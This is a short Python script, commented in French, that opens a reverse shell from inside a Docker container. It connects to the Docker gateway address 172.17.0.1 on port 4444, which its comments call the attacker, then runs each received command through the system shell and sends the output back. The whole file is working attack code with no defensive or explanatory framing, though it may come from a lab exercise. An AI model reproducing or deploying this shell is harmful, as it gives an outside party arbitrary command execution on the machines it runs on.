import socket
import subprocess
import os

try:
    # Se connecter à l'attaquant (IP du host Docker)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("172.17.0.1", 4444))  # IP gateway Docker
    
    s.send(b"[+] Connection established from container\n")
    
    while True:
        # Recevoir la commande
        cmd = s.recv(1024).decode().strip()
        
        if cmd.lower() == 'exit':
            s.send(b"[+] Closing connection\n")
            break
        
        if cmd:
            # Exécuter la commande
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                s.send(output)
            except subprocess.CalledProcessError as e:
                s.send(f"Error: {e.output}".encode())
        
        s.send(b"\n$ ")
    
    s.close()
except Exception as e:
    print(f"Connection failed: {e}")
